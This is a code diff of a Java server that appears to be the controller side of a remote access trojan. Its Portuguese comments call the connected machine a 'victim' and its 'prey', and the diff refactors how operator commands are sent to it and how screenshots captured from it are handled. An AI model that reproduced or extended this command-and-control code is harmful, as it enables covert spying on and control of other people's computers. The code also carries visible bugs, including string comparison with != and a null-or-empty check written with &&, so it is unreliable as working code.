@@ -1,13 +1,12 @@
-import javax.imageio.ImageIO;
-import javax.swing.*;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayInputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.net.ServerSocket;
 import java.net.Socket;
-import java.util.Objects;
 import java.util.Scanner;
+import javax.imageio.ImageIO;
+import javax.swing.JFrame;
 
 public class Server {
 
@@ -20,46 +19,35 @@ public class Server {
             System.out.println("Podipa vamo esperar o gatao entrar");
             Socket clientSocket = serverSocket.accept();
 
-            Connection victim = new Connection(clientSocket);
             System.out.println("Opa temos uma presa kkkkk de ip " + clientSocket.getInetAddress());
+
+            Connection targetConnection = new Connection(clientSocket);
+
+            runHandlerThread(targetConnection);
 
             String command;
             do {
                 command = sc.nextLine();
-                victim.sendMessage(new Message(command));
-                Message message = victim.readMessage();
-                String responseCommand = message.getCommand();
-
-                if (Objects.equals(responseCommand, "screen")) { // opa chegou a screenshot fera
-                    receiveScreenshot(message);
+                if(!isNullOrEmpty(command)) {
+                    targetConnection.sendMessage(new Message(command));
                 }
-                System.out.println(responseCommand);
-                System.out.println("--------------------");
-            } while (command != "quit");
 
-        } catch (Exception e) {
+            } while(command != "quit");
+
+
+
+        } catch(Exception e) {
             e.printStackTrace();
         }
     }
 
-    private static void receiveScreenshot(Message message) {
-        System.out.println("SCREENZAO CHEGOU HEIN");
-        JFrame window = new JFrame("An Image On Screen");
-
-        try {
-
-            byte[] imageBytes = (byte[]) message.getArguments().get(0);
-            InputStream in = new ByteArrayInputStream(imageBytes);
-            BufferedImage bufferedImage = ImageIO.read(in);
-
-            window.add(new ImageScreen(bufferedImage));
-
-            window.setLocationRelativeTo(null);
-            window.pack();
-            window.setVisible(true);
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-
+    private static void runHandlerThread(Connection targetConnection) {
+        new Thread(new ClientConnection(targetConnection)).start();
     }
+
+    private static boolean isNullOrEmpty(String command) {
+        return command == null && command.isEmpty();
+    }
+
+
 }
